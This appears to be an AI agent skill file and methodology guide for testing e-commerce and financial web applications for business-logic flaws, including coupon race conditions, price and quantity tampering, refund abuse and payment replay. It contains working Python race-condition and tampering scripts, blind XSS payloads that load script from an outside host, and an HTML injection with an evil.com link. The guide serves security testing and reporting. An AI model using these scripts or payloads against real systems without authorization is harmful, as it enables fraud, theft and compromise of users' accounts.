---
name: business-logic
description: Elite business logic security testing — workflow bypass, state machine abuse, race conditions, numeric manipulation, quota bypass — with mandatory invariant violation proof, UI workflow steps, real financial/operational impact demonstration
---

# Business Logic Flaws

Business logic vulnerabilities exploit the application's intended functionality against itself. They require understanding what the application is SUPPOSED to do, then finding ways to make it do something different — something that violates its business rules and causes real harm.

**CRITICAL RULE: A business logic finding is only valid when you can demonstrate a MEASURABLE VIOLATION of a domain invariant — not just unexpected behavior. "The response was 200 when I expected 403" is not a business logic bug. "I redeemed a $50 coupon code three times and received $150 discount on a single order" IS a business logic bug.**

---

## Real Impact Gate — Answer Before Reporting

1. **What invariant was violated?**
   - Invariant: a rule that should ALWAYS be true in the system
   - Examples: "a coupon can only be used once", "you cannot receive more refund than you paid", "you cannot have more seats than your subscription allows", "a user cannot be both premium and free simultaneously"
   - If you cannot state the violated invariant, you may not have a business logic bug

2. **Is the violation DURABLE?**
   - Does the exploited state persist in the system?
   - Visual inconsistency without database state change: NOT a vulnerability
   - Actual database state violation: YES

3. **What is the MEASURABLE impact?**
   - Financial: "I received $50 discount without being eligible" — quantify the loss per exploitation
   - Operational: "I can create unlimited accounts on a free trial plan" — quantify the cost to the company
   - Security: "I retained admin access after being downgraded" — describe the unauthorized capabilities

4. **Can this be repeated/scaled?**
   - Single occurrence might be acceptable edge case
   - Repeatable with automation → confirmed exploitable at scale

5. **Is this design-intent or a real bug?**
   - Review documentation, terms of service, feature descriptions before reporting
   - Some behaviors that look like bugs are documented and intentional

---

## Understanding the Application's Business Rules

Before testing, you MUST understand what the application is supposed to do.

### Documentation Review (Mandatory)
```
Step 1: Find and read all documentation:
  - User guide / help center
  - API documentation
  - Terms of service (especially billing, refund, cancellation policies)
  - FAQ pages
  - Developer documentation
  - Any marketing pages that describe plan limits, feature restrictions

Step 2: Build a business rule inventory:
  - Payment rules: can I pay partially? can I get a refund? when? how much?
  - Subscription rules: what are the plan limits? what happens on downgrade?
  - Coupon/discount rules: one per order? one per user? combinable?
  - Role rules: what can each role do? what requires approval?
  - Quota rules: what limits exist on storage, users, API calls, etc.?
  - Workflow rules: what steps are required? what order must they go in?

Step 3: Map all state machines:
  - Order lifecycle: draft → placed → paid → fulfilled → shipped → delivered → returned
  - Account lifecycle: free → trial → paid → suspended → deleted
  - Approval workflow: submitted → pending → approved/rejected
  - Identify: what are the valid transitions? what should be invalid?
```

### Attack Surface Mapping via UI
```
For every business-critical feature:
Step 1: Complete the happy path (normal flow) as a real user
Step 2: Record ALL HTTP requests made during the happy path
Step 3: Identify decision points:
  - Where does the server check if I'm eligible?
  - Where does the server validate my subscription level?
  - Where does the server check if the coupon is valid?
  - Where does the server update the database?
Step 4: Think about what would happen if:
  - I skip step 2 and jump to step 4
  - I repeat step 3 twice simultaneously
  - I modify the price between step 2 and step 4
  - I submit negative values
  - I send two identical requests at the same time
```

---

## High-Value Testing Scenarios

### Scenario 1: Coupon/Discount Abuse

```python
import asyncio, aiohttp

async def test_coupon_race_condition(apply_coupon_url, coupon_code, session_cookie, n=20):
    """Test if coupon can be applied multiple times via race condition"""
    
    async with aiohttp.ClientSession(cookies={"session": session_cookie}) as session:
        # Apply coupon n times simultaneously
        tasks = [
            session.post(apply_coupon_url, json={"code": coupon_code})
            for _ in range(n)
        ]
        results = await asyncio.gather(*tasks)
        responses = [(r.status, await r.text()) for r in results]
    
    successful = [(s, b) for s, b in responses if s == 200 and "success" in b.lower()]
    print(f"Total attempts: {n}")
    print(f"Successful applications: {len(successful)}")
    
    if len(successful) > 1:
        print(f"RACE CONDITION: Coupon '{coupon_code}' applied {len(successful)} times!")
        print("Business impact: Multiple discounts received for single-use coupon")
        return True
    return False

# Also test sequential reuse
def test_coupon_reuse(apply_coupon_url, coupon_code, session_cookie):
    """Test if coupon can be used multiple times sequentially"""
    
    results = []
    for i in range(3):
        r = requests.post(apply_coupon_url,
            json={"code": coupon_code},
            cookies={"session": session_cookie})
        results.append(r.status_code)
        print(f"Attempt {i+1}: {r.status_code} — {r.text[:100]}")
    
    if results.count(200) > 1:
        print(f"COUPON REUSE: Used {results.count(200)} times!")
        return True
    return False
```

### Scenario 2: Price/Cart Manipulation

```
UI STEPS FOR PRICE MANIPULATION TESTING:

Step 1: Navigate to the product page
Step 2: Add item to cart (price: $99.00)
Step 3: Click "Proceed to Checkout"
Step 4: Open browser DevTools → Network tab
Step 5: Find the checkout/order-confirm API request
Step 6: Observe the request body — does it include price/amount fields?

ATTACK:
Step 7: Intercept the checkout POST request via proxy
Step 8: Modify the price parameter:
  - Change {"price": 99.00} to {"price": 0.01}
  - Or: {"price": -99.00} (negative price = server PAYS you)
  - Or: {"quantity": 1} to {"quantity": 0} but still add to cart
Step 9: Forward the modified request
Step 10: Check if the order is created at the modified price
Step 11: Check the order history and database to confirm the price was accepted
```

```python
def test_price_manipulation(checkout_url, session_cookie, original_price):
    """Test server-side price validation"""
    
    manipulated_prices = [
        0.01,      # Minimal price
        -original_price,  # Negative (refund scenario)
        0,         # Zero price
        0.001,     # Sub-cent
        999999,    # Overflow attempt
    ]
    
    for price in manipulated_prices:
        r = requests.post(checkout_url,
            json={
                "items": [{"product_id": "PROD123", "quantity": 1, "price": price}],
                "total": price
            },
            cookies={"session": session_cookie})
        
        if r.status_code == 200:
            order_data = r.json()
            if order_data.get("total_charged") == price:
                print(f"PRICE MANIPULATION: Order created at ${price} instead of ${original_price}")
                return True
    return False
```

### Scenario 3: Race Conditions — Double Spending

```python
import asyncio, aiohttp

async def test_race_condition_double_spend(action_url, payload, session_cookie, n=50):
    """Test for race conditions that allow double-spending"""
    
    print(f"Sending {n} simultaneous requests to {action_url}")
    
    async with aiohttp.ClientSession(cookies={"session": session_cookie}) as session:
        tasks = [session.post(action_url, json=payload) for _ in range(n)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    responses = []
    for r in results:
        if isinstance(r, Exception):
            continue
        status = r.status
        try:
            body = await r.json()
        except:
            body = await r.text()
        responses.append({"status": status, "body": body})
    
    # Analyze: how many succeeded?
    successful = [r for r in responses if r["status"] == 200]
    print(f"Successful: {len(successful)}/{n}")
    
    if len(successful) > 1:
        print(f"RACE CONDITION CONFIRMED: {len(successful)} requests succeeded simultaneously")
        print(f"Business impact: {len(successful)}x execution of single-allowed action")
        return True, len(successful)
    
    return False, 1

# Test scenarios:
# 1. Coupon code application
asyncio.run(test_race_condition_double_spend(
    "/api/cart/apply-coupon", {"code": "SAVE50"}, user_cookie
))
# 2. Credit/refund claiming
asyncio.run(test_race_condition_double_spend(
    "/api/rewards/claim", {"reward_id": 123}, user_cookie
))
# 3. Limited-quantity item purchase
asyncio.run(test_race_condition_double_spend(
    "/api/cart/reserve", {"product_id": "LIMITED_ITEM_001", "quantity": 1}, user_cookie
))
```

### Scenario 4: Workflow Step Skipping

```
MULTI-STEP WORKFLOW BYPASS:

Suppose the checkout flow is:
  Step 1: POST /api/checkout/start → returns checkout_session_id
  Step 2: POST /api/checkout/add-payment → payment method validated
  Step 3: POST /api/checkout/confirm → order placed

ATTACK: Skip step 2 (payment) and go directly to step 3
Step 1: Start checkout normally → get checkout_session_id: "sess_abc123"
Step 2: SKIP — do NOT add payment information
Step 3: POST /api/checkout/confirm with checkout_session_id: "sess_abc123"
Expected: 400 error "Payment method required"
If: 200 OK with order created → WORKFLOW BYPASS confirmed
```

```python
def test_workflow_bypass(workflow_steps, session_cookie):
    """Test if workflow steps can be skipped"""
    
    skipped_results = []
    
    # Try all combinations of skipping steps
    for skip_step in range(1, len(workflow_steps)):
        session_id = None
        
        for i, (url, payload_template) in enumerate(workflow_steps):
            if i == skip_step:
                print(f"Skipping step {i+1}: {url}")
                continue
            
            # Fill in session_id if needed
            payload = dict(payload_template)
            if "session_id" in payload and session_id:
                payload["session_id"] = session_id
            
            r = requests.post(url, json=payload, cookies={"session": session_cookie})
            
            if i == 0 and r.status_code == 200:
                session_id = r.json().get("session_id")
            
            if i == len(workflow_steps) - 1:  # Final step
                if r.status_code == 200:
                    print(f"WORKFLOW BYPASS: Skipping step {skip_step+1} still succeeded!")
                    skipped_results.append(skip_step)
    
    return skipped_results
```

### Scenario 5: Subscription Limit Bypass

```python
def test_subscription_limit_bypass(create_resource_url, session_cookie, plan_limit=5):
    """Test if subscription limits can be exceeded"""
    
    created_resources = []
    
    # Create resources up to and beyond the limit
    for i in range(plan_limit + 10):
        r = requests.post(create_resource_url,
            json={"name": f"Resource {i}"},
            cookies={"session": session_cookie})
        
        print(f"Resource {i+1}: {r.status_code} — {r.text[:50]}")
        
        if r.status_code == 200:
            created_resources.append(r.json())
        elif r.status_code in [402, 403, 400] and i >= plan_limit:
            print(f"Limit enforced at resource {i+1} — server responded {r.status_code}")
            break
    
    if len(created_resources) > plan_limit:
        print(f"LIMIT BYPASS: Created {len(created_resources)} resources (limit is {plan_limit})")
        return True, len(created_resources)
    
    return False, len(created_resources)
```

### Scenario 6: Refund Fraud

```
UI STEPS FOR REFUND FRAUD TESTING:

Step 1: Make a purchase as User A ($50.00 order)
Step 2: Complete the purchase flow
Step 3: Note the order ID: ORDER-12345
Step 4: Navigate to Order History → click ORDER-12345 → click "Request Refund"
Step 5: Submit refund request → confirm $50.00 refund received

ATTACK ATTEMPTS:
Attempt 1: Request second refund for same order
  - Navigate to ORDER-12345 again → click "Request Refund" again
  - If allowed: double refund vulnerability

Attempt 2: Partial refund manipulation  
  - Request partial refund for $25.00
  - Then request another partial refund for $30.00 (total > original $50.00)
  - If allowed: over-refund vulnerability

Attempt 3: Race condition refund
  - Send 10 refund requests simultaneously
  - Check: how many were processed? Was the same order refunded multiple times?
```

---

## Advanced Testing: Numeric Manipulation

```python
numeric_test_cases = [
    # Negative quantity
    {"quantity": -1, "price": 10.00},  # Should result in credit? Or error?
    # Zero quantity
    {"quantity": 0, "price": 10.00},
    # Extreme values
    {"quantity": 999999999, "price": 10.00},
    {"quantity": 1, "price": 0.0001},
    # Floating point manipulation
    {"quantity": 0.1 + 0.2, "price": 10.00},  # 0.30000000000000004 != 0.3
    # String coercion
    {"quantity": "999", "price": "0.01"},  # Loose type checking
    # Mixed types
    {"quantity": True, "price": 10.00},  # True == 1 in many languages
    {"quantity": "1e100", "price": "1e-100"},  # Scientific notation
]
```

---

## UI Reproduction Steps — Required in Every Report

```
RACE CONDITION DOUBLE COUPON REDEMPTION:

PRE-REQUISITES:
- User A has a single-use coupon code: "SAVE50" (50% off, one use per account)
- The cart has an item worth $100.00
- Without coupon: pay $100.00
- With coupon (expected): pay $50.00
- With coupon (if vulnerable): pay $0.00 or receive $50.00 credit multiple times

ATTACK:

Step 1: Log in as User A
Step 2: Navigate to https://target.com/cart
Step 3: Add product to cart (confirm price: $100.00)
Step 4: Navigate to cart/checkout page
Step 5: Locate the coupon code field
Step 6: Open browser DevTools → Network tab

Step 7: SETUP RACE CONDITION (Python):
  Save this script as /tmp/race_coupon.py and run it:
  
  import asyncio, aiohttp
  async def main():
    async with aiohttp.ClientSession(cookies={"session": "USER_A_SESSION"}) as s:
      tasks = [s.post("https://target.com/api/cart/apply-coupon",
                json={"code": "SAVE50"}) for _ in range(20)]
      results = await asyncio.gather(*tasks)
      for i, r in enumerate(results):
        body = await r.json()
        print(f"Request {i}: {r.status} — {body}")
  asyncio.run(main())

Step 8: Run the script
Step 9: Observe: multiple requests return 200 with "Coupon applied successfully"
  Screenshot: terminal output showing 5+ successful coupon applications

Step 10: Navigate to https://target.com/cart
  Screenshot: cart showing coupon applied with large discount

Step 11: Navigate to Account → Order History (after completing purchase)
  Screenshot: Order total showing $0.00 or negative balance (coupon applied multiple times)

Step 12: Check Account → Store Credit/Balance (if applicable)
  Screenshot: Store credit balance inflated beyond expected value
```

---

## Complete Report Format

**TITLE**: Race Condition in Coupon Application — Single-Use Coupon Can Be Applied Multiple Times via Parallel Requests

**SEVERITY**: High (financial impact — direct loss per exploit)

**VALIDATION**:
- Signal 1: Sent 20 parallel requests to /api/cart/apply-coupon — 7 requests returned 200 with "Coupon applied successfully"
- Signal 2: Order history shows the coupon discount applied $350 total (7 × $50) instead of $50 maximum — order completed at $0 instead of $100
- Invariant violated: "Coupon SAVE50 can be used once per account" — database shows 7 redemptions for the same account and same coupon code
- Durability confirmed: the over-discounted order persists in the database and the coupon is marked as "fully consumed"
- Repeatability: ran the test 3 times — consistently produced 5-8 successful applications per run

**REAL IMPACT**:
Any customer who knows this technique can use any single-use coupon code to receive unlimited discounts. A 50%-off coupon (SAVE50) becomes a 100% off coupon when 2 parallel requests succeed, meaning the attacker pays $0 for $100 worth of goods. At scale, an attacker could automate this for every order, paying nothing while receiving real goods or services. The company loses the full product value for every order placed this way. A single attacker running this automation could cause thousands of dollars in losses per hour. Additionally, any other single-use promotion (welcome discount, referral bonus, loyalty credit) is similarly exploitable.

**RECOMMENDED FIX**:
1. Primary: Implement database-level atomic operations for coupon redemption using optimistic locking or SELECT FOR UPDATE:
   ```sql
   BEGIN TRANSACTION;
   SELECT * FROM coupon_usages WHERE coupon_code = ? AND user_id = ? FOR UPDATE;
   -- If already redeemed: ROLLBACK and return error
   -- If not redeemed: INSERT into coupon_usages and COMMIT
   COMMIT;
   ```
2. Secondary: Add application-level distributed lock (Redis SETNX with TTL) before coupon processing:
   ```python
   lock_key = f"coupon_lock:{user_id}:{coupon_code}"
   if not redis.setnx(lock_key, 1, ex=10):  # 10 second lock
       return {"error": "Coupon application in progress"}
   try:
       apply_coupon(user_id, coupon_code)
   finally:
       redis.delete(lock_key)
   ```
3. Verification: After fix, run the parallel test again — confirm only 1 of the 20 requests succeeds

---

## False Positive Rejection Rules

- Unexpected behavior that doesn't violate a documented business rule: NOT a vulnerability (may be design debt)
- Price change between cart and checkout that the application acknowledges and corrects: NOT a vulnerability (server-side re-validation working correctly)
- Race condition that produces duplicate database entries that are then caught and deduplicated before any impact: NOT a confirmed vulnerability
- Behaviors explicitly documented as allowed (e.g., coupon stackable by design, unlimited refunds in policy): NOT a vulnerability
- Admin-only actions that are exploitable but require admin privileges: NOT a privilege issue if admin intentionally has that access
- Rate limiting that only affects API calls but not final order processing: only report if the rate limit bypass enables completing a harmful action


## Additional Techniques — ported from WebSkills (money-related-features-test)

Money-feature-specific abuses that complement the coupon/price/refund/race scenarios above. Keep the whole transaction lifecycle proxied and at each handoff ask: can I tamper with a value a previous stage already trusted, send it concurrently, replay it, or read someone else's? Require a **net economic effect** (paid less / gained credit / got a free item / read another user's data) — a tampered request returning 200 is not enough.

### Refund abuse
- Buy a subscription, request a refund, check the feature stays accessible after refunding.
- Currency arbitrage on refund (see below).
- Race multiple subscription-cancellation requests → multiple refunds.

### Cart / quantity
- Add one product in **negative quantity** alongside positive-quantity products to balance/lower the total.
- Add more than the available quantity.
- Move a wishlist item to another user's cart, or delete from theirs.

### IDOR on orders / invoices / price
```
/account/orders/12345
/account.php?history=y&orderno=10425128
/pdf/<ordernumber>.pdf   e.g. /pdf/10425128.pdf   (invoice IDOR)
```
- Change-price IDOR — make a buy request and tamper the price in request/response.

### Excessive data exposure — full card / CVV
UI masks the card but the raw JSON may return the full PAN + CVV. Always read the raw response:
```
{"first_name":"Harry","mask_cc":"******4510","exp_date":"08/23","cvv":"123","full_card":"6011111111114510"}
```

### Guest order → order-history / PII takeover
If the app permits guest checkout AND lacks email verification (or you have a verify-bypass): place a guest order using the victim's email; then register `victim@example.com`; the account's order history exposes the victim's prior orders and PII.

### Transfer / loan logic
- **Negative amount bypasses a transfer limit** — a `if(amount>3000) return false` check is defeated by `"amount":"-4500"`.
- **Loan never comes due** — set the first repayment date to `31/February` (`31022015`); the date never arrives.

### Buy at a lower price via payment replay
Add cheap items → capture the encrypted payment data sent to the gateway → start a new order with expensive items → replace the payment data with the captured (cheaper) blob. If the app doesn't cross-validate, you buy expensive goods at the low price.

### Discount / gift-code flaws
- Apply the same code more than once (reuse); enter then remove the code from the request; manipulate the response on reuse.
- Multi-item discount → intercept and change to one item; apply codes to non-discounted items by tampering server-side.
- **No rate limit** (ref: hackerone.com/reports/123091); **race-condition redeem** for multiple redemptions / free gift-card "money" (ref: 157996); race bypasses invitation limit (ref: 115007).
- **HPP / mass assignment** to add multiple codes when the UI accepts one.
- XSS / SQLi in the code field. (ref: 759247)

### Currency arbitrage
Pay in one currency (USD), get the refund in another (EUR); exploit conversion-rate differences — target a weaker currency.

### Delivery charges
- Tamper the delivery rate to a negative value to reduce the total; tamper params for free delivery.

### Rate limit
- No rate limit on contact-us / code endpoints (ref: 856305); general rate-limit bypass.

### Attachments
- Predictable attachment IDs → IDOR to other users' attachments.
- Copy attachment links before submitting a money form, then open them from another browser post-submission.

### Injection on money/support surfaces
- Blind XSS on support/image-upload chat (ref: 1010466):
```
"><img src=x id=<b64> onerror=eval(atob(this.id))>
'"><script src=//xss.report/s/...></script>
```
- HTML injection / IMG injection: `"/><img src="x"><a href="https://evil.com">login</a>`.


## Additional Techniques — ported from WebSkills (combined-security-test)

Financial checklist deltas beyond the coupon/price/race/workflow/subscription scenarios above. Model the full lifecycle as trust boundaries — *basket → price → discount → currency → payment → provider callback → order → refund → rewards* — and ask "can I change one stage after a later stage already trusted it?"

### Currency Manipulation & Arbitrage

- Change the `currency` parameter in the payment request (multi-currency apps) to a lower-value currency and check for inconsistent credit.
- Tamper with the currency **inside the payment provider's** request/response, not just the app's.
- **Arbitrage:** deposit in one currency and withdraw in another where the deposit API and withdrawal API use **inconsistent exchange rates or rounding rules** → net profit.

### Rounding & Numeric-Processing Abuse

- **Rounding accumulation:** deposit `£10.0049` but only `£10.00` is withdrawn while the balance credits the full amount — repeat many times to prove exploitability (report requires demonstrated net gain).
- **Cross-conversion rounding:** `$0.20 → £0.1352 → $0.2004` profit loops.
- Test exotic numeric formats the parser may mishandle: `9e99`, `1e-50`, `-0.00`, `001.0000`, `$10`, `£0`, near-max/min ints (overflow/underflow), `True` (== 1 in loose-typed backends).

### Payment Callback / Response Manipulation & Replay

- Intercept the third-party payment callback and flip the `paid`/status field → verify the backend re-validates server-side.
- **Replay a successful callback** with the same transaction ID → does the system re-credit / re-process? Replay reused encrypted tokens as new transactions.

### Card-Number Handling

- Confirm saved cards are masked (last-4 only) in checkout UI and HTTP responses.
- If the site blocks duplicate cards, attempt registering a card already on another account → the block message can leak that another user holds that card (enumeration).

### Dynamic Pricing / Signature Flaws

- If price depends on currency/device/referral/time, submit a price ±0.01 from the original and check whether an unexpected margin is accepted.
- Verify dynamic-price inputs are **cryptographically signed** — if not, tamper freely.
- **Signature/hash concatenation:** test whether moving part of one parameter into an adjacent one preserves a valid signature (concatenation-boundary confusion).

### Discount / Voucher / Reward Logic

- **Earn > spend:** pay with points and check whether points are *also earned* on the same transaction → net gain.
- **Refund-in-the-middle:** buy → spend the earned points/free items → refund the purchase → check whether the reward reversal is incomplete.
- **Basket manipulation after discount calc:** remove items or mix discounted + non-discounted items post-calculation and see if the discount stays valid.
- **Offer stacking:** combine BOGO / 3-for-2 / percentage promos that shouldn't stack.
- **Buy-X-get-Y-free:** verify the *cheapest* item is discounted, not the most expensive.
- **Voucher/gift-card enumeration:** guess codes for other users; assess code randomness.

### Hidden Backend / Virtual Goods

- Discover admin/bulk/balance-adjustment APIs not exposed in the UI and test unauthorized access.
- Direct-object-reference downloadable/virtual goods (guess the URL of a paid asset).
- Hunt for debug/test payment endpoints and dummy card numbers left in production.

Reference: Soroush Dalili, "Common Security Issues in Financially-Orientated Web Applications."
